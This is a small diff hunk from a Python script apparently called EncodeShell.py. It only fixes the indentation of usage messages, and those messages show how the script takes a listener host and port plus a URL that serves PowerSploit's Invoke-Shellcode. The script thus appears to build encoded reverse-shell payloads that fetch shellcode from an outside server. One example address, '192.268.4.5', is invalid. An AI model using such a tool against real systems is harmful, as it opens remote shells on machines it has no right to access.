@@ -54,5 +54,5 @@ try:
 #index error
 except IndexError:
     print "python EncodeShell.py lhost lport url"
-  	print "ex: python EncodeShell.py '192.268.4.5' '443' 'default'"
-	  print "ex: python EncodeShell.py '192.268.4.5' '443' 'http://192.168.4.5/powersploit/invoke-shellcode/'"
+    print "ex: python EncodeShell.py '192.268.4.5' '443' 'default'"
+    print "ex: python EncodeShell.py '192.268.4.5' '443' 'http://192.168.4.5/powersploit/invoke-shellcode/'"
